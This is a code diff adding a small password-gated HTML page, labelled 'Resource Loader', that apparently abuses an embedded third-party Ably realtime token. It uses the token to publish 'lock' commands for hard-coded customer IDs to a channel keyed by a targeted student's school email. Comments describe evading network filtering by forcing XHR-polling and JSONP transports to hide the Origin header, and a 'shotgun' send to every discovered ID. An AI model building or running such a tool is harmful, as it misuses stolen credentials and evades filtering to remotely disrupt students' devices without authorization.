@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Resource Loader</title>
+    <script src="https://cdn.ably.com/lib/ably.min-1.js"></script>
+    <style>
+        :root { --accent: #8b5cf6; --bg: #020617; --text: #f8fafc; }
+        body { font-family: sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: rgba(15,23,42,0.9); padding: 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: none; }
+        button { width: 100%; padding: 12px; background: var(--accent); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        #log { font-size: 10px; color: #10b981; margin-top: 15px; text-align: left; height: 60px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main">
+    <h2 id="title">shhhh.. 🤫</h2>
+    <input type="password" id="pw" placeholder="Key">
+    <div id="ui" style="display:none">
+        <input type="email" id="target" placeholder="student@school.edu">
+        <button onclick="run()">🚀 EXECUTE</button>
+    </div>
+    <button id="loginBtn" onclick="auth()">Login</button>
+    <div id="log">> Standby...</div>
+</div>
+
+<script>
+    const K = '1k1Wbw.G52kOXvb7p7UbwFRV3ahn74m6xklosio2XUdLlTL'; //
+    const D = ['60-7576-A000', '74-1335-F000', '60-8732-A000']; //
+    let ably = null;
+
+    function auth() {
+        if(document.getElementById('pw').value === 'shhhh') {
+            document.getElementById('ui').style.display = 'block';
+            document.getElementById('loginBtn').style.display = 'none';
+            document.getElementById('pw').style.display = 'none';
+            connect();
+        }
+    }
+
+    function connect() {
+        if (typeof Ably === 'undefined') return write("ERR: SDK Blocked", "red");
+        
+        // BYPASS ATTEMPT: We use a 'Token' auth method combined with 
+        // XHR-polling to hide the Origin header
+        ably = new Ably.Realtime({
+            token: K.trim(),
+            clientId: "shhhh-" + Math.random().toString(36).substr(2,4),
+            transports: ['xhr_polling', 'jsonp'], // WebSockets are usually the most filtered
+            useBinaryProtocol: false, 
+            tls: true
+        });
+
+        ably.connection.on('connected', () => {
+            document.getElementById('title').style.color = "#10b981";
+            write("HANDSHAKE SUCCESS", "#10b981");
+        });
+
+        ably.connection.on('failed', (err) => {
+            write("403: PLACEMENT REJECTED", "#ef4444");
+        });
+    }
+
+    function run() {
+        const mail = document.getElementById('target').value;
+        if(!mail || !ably) return;
+        
+        // SHOTGUN METHOD: Send to all discovered IDs at once
+        D.forEach(id => {
+            const chan = ably.channels.get(`user:${mail}`);
+            chan.publish('lock', { 
+                action: 'lock', 
+                data: { customerId: id, type: 'lock', lockExpiration: Date.now() + 300000 } 
+            });
+        });
+        write("SIGNAL DISPATCHED", "#8b5cf6");
+    }
+
+    function write(m, c) {
+        const l = document.getElementById('log');
+        l.innerHTML += `<br><span style="color:${c}">> ${m}</span>`;
+        l.scrollTop = l.scrollHeight;
+    }
+</script>
+</body>
+</html>
